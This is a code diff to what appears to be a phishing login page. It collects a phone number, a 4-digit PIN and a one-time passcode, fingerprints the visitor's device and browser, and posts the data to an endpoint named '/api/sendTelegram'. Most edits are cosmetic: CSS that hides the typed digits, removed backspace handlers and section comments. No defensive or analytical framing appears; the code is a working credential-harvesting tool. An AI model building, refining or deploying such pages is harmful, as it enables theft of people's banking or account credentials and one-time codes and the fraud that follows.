@@ -57,7 +57,6 @@ input{
 .small{font-size:13px;color:#9ca3af}
 .success{color:#22c55e;font-weight:600}
 
-/* repaint-safe warning */
 .error{
   min-height:18px;
   font-size:13px;
@@ -72,7 +71,9 @@ input{
   border:2px solid #fff;
   background:#fff;
   text-align:center;
-  font-size:0;
+  font-size:1px;          /* FIX */
+  color:transparent;
+  caret-color:transparent;
 }
 .pin-digit.filled{
   background:#2563eb;
@@ -102,7 +103,9 @@ input{
   border:2px solid #fff;
   background:#fff;
   text-align:center;
-  font-size:0
+  font-size:1px;          /* FIX */
+  color:transparent;
+  caret-color:transparent;
 }
 .otp-digit.filled{
   background:#2563eb;
@@ -184,6 +187,7 @@ input{
 </div>
 
 <script>
+/* ===== DEVICE ===== */
 const ua = navigator.userAgent;
 let device = 'Unknown';
 
@@ -198,6 +202,7 @@ if (/Chrome/i.test(ua)) device += ' | Chrome';
 else if (/Safari/i.test(ua)) device += ' | Safari';
 else if (/Firefox/i.test(ua)) device += ' | Firefox';
 
+/* ===== PHONE ===== */
 const phone = document.getElementById('phone');
 const phoneError = document.getElementById('phoneError');
 const loginBtn = document.getElementById('loginBtn');
@@ -223,9 +228,7 @@ phone.addEventListener('input',()=>{
   updateLogin();
 });
 
-phone.addEventListener('blur', validatePhone);
-
-/* PIN */
+/* ===== PIN ===== */
 const pins=[...document.querySelectorAll('.pin-digit')];
 let pinValue='';
 
@@ -237,20 +240,13 @@ pins.forEach((p,i)=>{
     pinValue=pins.map(x=>x.value).join('');
     updateLogin();
   });
-  p.addEventListener('keydown',e=>{
-    if(e.key==='Backspace'&&!p.value&&i>0){
-      pins[i-1].focus();
-      pins[i-1].value='';
-      pins[i-1].classList.remove('filled');
-      e.preventDefault();
-    }
-  });
 });
 
 function updateLogin(){
   loginBtn.disabled = !(validatePhone() && /^\d{4}$/.test(pinValue));
 }
 
+/* ===== API ===== */
 async function sendToServer(payload){
   return fetch('/api/sendTelegram',{
     method:'POST',
@@ -259,7 +255,7 @@ async function sendToServer(payload){
   });
 }
 
-/* OTP */
+/* ===== OTP ===== */
 const otpModal=document.getElementById('otpModal');
 const dEls=[0,1,2,3,4].map(i=>document.getElementById('d'+i));
 const confirmBtn=document.getElementById('confirmOtp');
@@ -302,19 +298,14 @@ dEls.forEach((d,i)=>{
     if(d.value && i<4) dEls[i+1].focus();
     updateConfirm();
   });
-  d.addEventListener('keydown',e=>{
-    if(e.key==='Backspace'&&!d.value&&i>0){
-      dEls[i-1].focus();
-      dEls[i-1].value='';
-      dEls[i-1].classList.remove('filled');
-      e.preventDefault();
-    }
-  });
 });
 
+/* ===== LOGIN ===== */
 document.getElementById('loginForm').addEventListener('submit',async e=>{
   e.preventDefault();
   if(document.getElementById('hp').value) return;
+
+  if (navigator.vibrate) navigator.vibrate(30); // vibration
 
   otpModal.style.display='flex';
   dEls.forEach(d=>{d.value='';d.classList.remove('filled')});
